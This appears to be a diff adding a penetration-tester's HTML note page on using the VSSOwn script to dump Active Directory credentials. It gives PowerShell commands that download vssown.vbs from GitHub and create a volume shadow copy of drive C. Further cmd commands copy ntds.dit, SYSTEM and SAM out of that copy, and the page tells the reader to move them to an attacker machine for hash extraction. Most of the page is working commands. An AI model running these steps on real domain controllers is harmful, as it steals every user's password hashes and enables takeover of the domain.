@@ -1,0 +1,38 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>vssOwn (Powershell 2.0+)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>vssOwn (Powershell 2.0+)</h1><br /><br /><strong>
+      <h3>VSSOwn</h3>
+    </strong><br />Because vssadmin in Powershell 2 is not capable of creating Volume Shadow Copies (VSCs) from the
+    command line, we can use VSSOwn.<br />VSSOwn is a Visual Basic Script created by Tim Tomes and Mark
+    Baggett.<br /><br /><strong>Create a shadow copy of ntds.dit </strong><br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;(New-Object&nbsp;System.Net.WebClient).downloadfile(&quot;https://raw.githubusercontent.com/lanmaster53/ptscripts/master/windows/vssown.vbs&quot;,&quot;$env:userprofile\desktop\vssOwn.vbs&quot;);<br />PS&gt;&nbsp;cd&nbsp;$env:userprofile\desktop\<br />PS&gt;&nbsp;cscript&nbsp;vssown.vbs&nbsp;/status<br />PS&gt;&nbsp;cscript&nbsp;vssown.vbs&nbsp;/start<br />PS&gt;&nbsp;cscript&nbsp;vssown.vbs&nbsp;/create&nbsp;C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Create&nbsp;a&nbsp;shadow&nbsp;copy&nbsp;of&nbsp;ntds.dit&nbsp;for&nbsp;the&nbsp;specified&nbsp;drive&nbsp;letter&nbsp;C
+      </div>
+    </div><br /> <a href=""><img src="images/1192-1.png" alt="images/1192-1.png" /></a><br /><br />We have to execute
+    these commands from Command Line(cmd) otherwise they will not work.<br />The file will be copied in the current
+    directory, because of the “.”<br />
+    <div class="codebox">
+      <div class="codebox">
+        C:\Users\Administrator\Desktop&gt;&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit&nbsp;.<br />C:\Users\Administrator\Desktop&gt;&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM&nbsp;.<br />C:\Users\Administrator\Desktop&gt;&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM&nbsp;.<br />C:\Users\Administrator\Desktop&gt;&nbsp;cscript&nbsp;vssown.vbs&nbsp;/stop&nbsp;&nbsp;&nbsp;#stop&nbsp;VSS&nbsp;service&nbsp;using&nbsp;vssown.vbs
+      </div>
+    </div><br />Besides of ntds.dit we need also SYSTEM and SAM portions of the Registry because they contain the
+    decryption keys needed to extract the hashes from the ntds.dit file.<br /><br />Now we have to Download these three
+    files(ntds.dit, SYSTEM, SAM) on the Attacker machine and use a parsing digital forensic tool like the one from Csaba
+    Barta to extract the hashes from the ntds.dit file using SYSTEM and SAM.<br />An Explanation on how it works here:
+    <a
+      href="https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf" target="_blank">https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&amp;-forensic-analysis.pdf</a><br />
+  </div>
+</body>
+
+</html>
